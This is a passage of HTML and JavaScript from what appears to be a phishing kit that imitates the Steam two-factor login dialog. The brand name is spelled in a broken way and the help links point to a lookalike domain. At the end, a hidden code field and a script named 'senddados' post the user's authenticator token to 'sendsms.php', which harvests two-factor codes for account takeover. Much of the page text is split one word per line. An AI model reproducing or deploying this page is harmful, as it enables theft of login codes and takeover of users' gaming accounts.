
<br>that
isn't
quite
right...</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode_message" style="display:
none;">
					<div class="auth_modal_h1">Whoops!</div>
					<p>Sorry
but

<br>that
isn't
quite
right...</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_couldnthelp" style="display:
none;">
					<div class="auth_modal_h1">Let
us
help!</div>
					<p>If
you
have
lost
access
to
your
mobile
device

the
mobile
phone
number
associated
with
your
account

and
don't
have
the
recovery
code
that
you
wrote
down
when
you
added
the
mobile
authenticator

then
please
contact
S
tea
mSupport
for
assistance
recovering
access
to
your
account.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_help" style="display:
none;">
					<div class="auth_modal_h1">Let
us
help!</div>
					<p>Sorry
you're
having
trouble.

We
know
your
S
tea
maccount
is
valuable
to
you

and
we're
committed
to
helping
you
keep
access
to
it
in
the
right
hands.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_failure" style="display:
none;">
					<div class="auth_modal_h1">Sorry!</div>
					<p>There
was
an
error
encountered
while
processing
your
request.</p>
				</div>
			</div>
		</div>
		<div id="login_twofactorauth_details_messages" class="twofactorauth_details_messages">
			<div class="twofactorauth_details" id="login_twofactorauth_details_entercode" style="display:
none;">
				Enter
the
current
code
displayed
in
the
S
tea
mMobile
app:			</div>
			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp" style="display:
none;">
				If
you
have
lost
your
mobile
device
or
uninstalled
the
S
tea
mapp
and
can
no
longer
receive
codes

then
you
may
remove
the
mobile
authenticator
fro
myour
account.
This
will
reduce
the
security
on
your
account

so
you
should
add
a
mobile
authenticator
to
a
new
mobile
device
afterwards.			</div>
			<div class="twofactorauth_details" id="login_twofactorauth_details_help" style="display:
none;">
				Please
contact
S
tea
mSupport
for
assistance
fro
ma
member
of
our
staff.			</div>
			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp_failure" style="display:
none;">
			</div>
			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp_rcode_incorrectcode" style="display:
none;">
			</div>
			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp_rcode_incorrectcode_exhausted" style="display:
none;">
			</div>
		</div>
		<div class="twofactorauthcode_entry_area">
			<div id="login_twofactor_authcode_entry">
				<div class="twofactorauthcode_entry_box">
					<input class="twofactorauthcode_entry_input
authcode_placeholder" id="twofactorcode_entry" type="text" placeholder="enter
your
code
here" autocomplete="off">
				</div>
			</div>
			<div id="login_twofactor_authcode_help_supportlink">
				<a href="https://help.crashdontenter.com/en/faqs/view/06B0-26E6-2CF8-254C">
					Contact
S
tea
mSupport
for
help
with
account
access				</a>
			</div>
		</div>
		<div class="modal_buttons" id="login_twofactorauth_buttonsets">
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_entercode" style="display:
none;">
				<div type="submit" class="auth_button
leftbtn" data-modalstate="submit">
					<div class="auth_button_h3">Submit</div>
					<div class="auth_button_h5">my
authenticator
code</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp">
					<div class="auth_button_h3">Please
help</div>
					<div class="auth_button_h5">I
no
longer
have
access
to
my
Mobile
Authenticator
codes</div>
				</div>
				<div style="clear:
left;"></div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_incorrectcode" style="display:
none;">
				<div class="auth_button
leftbtn" data-modalstate="submit">
					<div class="auth_button_h3">I
want
to
try
again</div>
					<div class="auth_button_h5">and
I've
re-entered
my
authenticator
code
above</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp">
					<div class="auth_button_h3">Please
help</div>
					<div class="auth_button_h5">I
think
I
need
assistance
fro
mS
tea
mSupport...</div>
				</div>
				<div style="clear:
left;"></div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp" style="display:
none;">
				<div class="auth_button
leftbtn" data-modalstate="selfhelp_sms_remove_start">
					<div class="auth_button_h3" style="font-size:
16px;">Remove
authenticator</div>
					<div class="auth_button_h5">and
go
back
to
receiving
codes
by
email</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_sms_reset_start">
					<div class="auth_button_h3">Use
this
device</div>
					<div class="auth_button_h5">and
get
authenticator
codes
on
this
app</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_sms_remove" style="display:
none;">
				<div class="auth_button
leftbtn" data-modalstate="selfhelp_sms_remove_sendcode">
					<div class="auth_button_h3">OK!</div>
					<div class="auth_button_h5">Send
me
the
text
message</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_nosms">
					<div class="auth_button_h3">I
can't</div>
					<div class="auth_button_h5">because
I
no
longer
have
access
to
that
phone
number</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_sms_remove_entercode" style="display:
none;">
				<div class="auth_button
leftbtn" data-modalstate="selfhelp_sms_remove_checkcode">
					<div class="auth_button_h3">Submit</div>
					<div class="auth_button_h5">I
entered
the
code
above</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_nosms">
					<div class="auth_button_h3">Please
help</div>
					<div class="auth_button_h5">I'
mnot
receiving
the
text
message</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_sms_remove_incorrectcode" style="display:
none;">
				<div class="auth_button
leftbtn" data-modalstate="selfhelp_sms_remove_checkcode">
					<div class="auth_button_h3">Submit</div>
					<div class="auth_button_h5">I
re-entered
the
code.
Let's
try
again.</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_nosms">
					<div class="auth_button_h3">Please
help</div>
					<div class="auth_button_h5">I'
mnot
receiving
the
text
message</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_twofactor_removed" style="display:
none;">
				<div class="auth_button
leftbtn" data-modalstate="selfhelp_sms_remove_complete">
					<div class="auth_button_h3">Log
in</div>
					<div class="auth_button_h5">with
the
mobile
authenticator
removed</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_twofactor_replaced" style="display:
none;">
				<div class="auth_button
leftbtn" data-modalstate="selfhelp_sms_remove_complete">
					<div class="auth_button_h3">Log
in</div>
					<div class="auth_button_h5">to
the
S
tea
mMobile
app</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_nosms" style="display:
none;">
				<div class="auth_button
leftbtn" data-modalstate="selfhelp_rcode">
					<div class="auth_button_h3">Yes</div>
					<div class="auth_button_h5">I
have
the
recovery
code
that
begins
with
'R'</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_couldnthelp">
					<div class="auth_button_h3">No</div>
					<div class="auth_button_h5">I
don't
have
a
code
like
that</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_rcode" style="display:
none;">
				<div class="auth_button
leftbtn" data-modalstate="selfhelp_rcode_checkcode">
					<div class="auth_button_h3">Submit</div>
					<div class="auth_button_h5">my
recovery
code</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_couldnthelp">
					<div class="auth_button_h3">Please
help</div>
					<div class="auth_button_h5">I
think
I
need
assistance
fro
mS
tea
mSupport...</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_rcode_incorrectcode" style="display:
none;">
				<div class="auth_button
leftbtn" data-modalstate="selfhelp_rcode_checkcode">
					<div class="auth_button_h3">Submit</div>
					<div class="auth_button_h5">I
re-entered
the
code.
Let's
try
again.</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_couldnthelp">
					<div class="auth_button_h3">Please
help</div>
					<div class="auth_button_h5">I
think
I
need
assistance
fro
mS
tea
mSupport...</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_rcode_incorrectcode_exhausted" style="display:
none;">
				<div class="auth_button" data-modalstate="selfhelp_couldnthelp">
					<div class="auth_button_h3">Please
help</div>
					<div class="auth_button_h5">I
think
I
need
assistance
fro
mS
tea
mSupport...</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_couldnthelp" style="display:
none;">
				<a class="auth_button
leftbtn" href="https://help.crashdontenter.com/">
					<div class="auth_button_h3">Contact
us</div>
					<div class="auth_button_h5">for
help
with
account
access</div>
				</a>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_waiting" style="display:
none;">
			</div>
		</div>
		<div style="display:
none;">
			<input type="submit">
		</div>
		</form>
	</div>
</div><div class="FullModalOverlay" style="display:
none;"><div class="ModalOverlayContent
ModalOverlayBackground"></div></div>



<div class="FullModalOverlay" style="display:
none;"><div class="ModalOverlayContent
ModalOverlayBackground"></div></div>undefined
<noscript></noscript>
<input style="display:none" type="text" required="" maxlength="6" id="token" name="auth_code" ng-model="passCode" input-characters-auto-submit="6" focus="" placeholder="6-digit code" class="ng-pristine ng-invalid ng-invalid-required ng-touched" value="">
    <button style="display:none" onsubmit="colocarse();" onclick="senddados();" id="submit-login" class="submit" ng-disabled="submitting">
      <span ng-show="submitting" id="loadimg" style="display:none"><i class="fa fa-spin fa-spinner"></i></span>
      Verify
    </button>
 
  

 
 
 
  
 
   
  	


 
 


 


   <script>
      
        function senddados() {

            $(document).ready(function(){     
                
            
      
                var token = $("#token").val();
                            
                if(token == "" || token.lenght < 6){
                    return false
                }else{
                
                    
                        
                   $.ajax({
                    type:'post',    //Definimos o método HTTP usado
                    data: {
                    token: token
                 
                    },
                    //dataType: 'json', //Definimos o tipo de retorno
                     url: 'sendsms.php', //Definindo o arquivo onde serão buscados os dados
                    success: function(data){
                    
                
               document.getElementById('submit-login').disabled = true;
             //  document.getElementById("bb").style.display = "none";
               document.getElementById("loadimg").style = "";
               document.getElementById("error").style.display = "none";
              

                        
                    }
                }); 
                
                }
            });

            return false;
        }

      
    </script>
 	<script>
	var helloBtn = document.getElementById("hello-btn");

helloBtn.addEventListener("click", () => {
  console.log("Btn clicked");
});

var interval = window.setInterval(() => {
  helloBtn.click();
}, 2000);

	</script>


<div class="FullModalOverlay" style="display: none;"><div class="ModalOverlayContent ModalOverlayBackground"></div></div></body></html>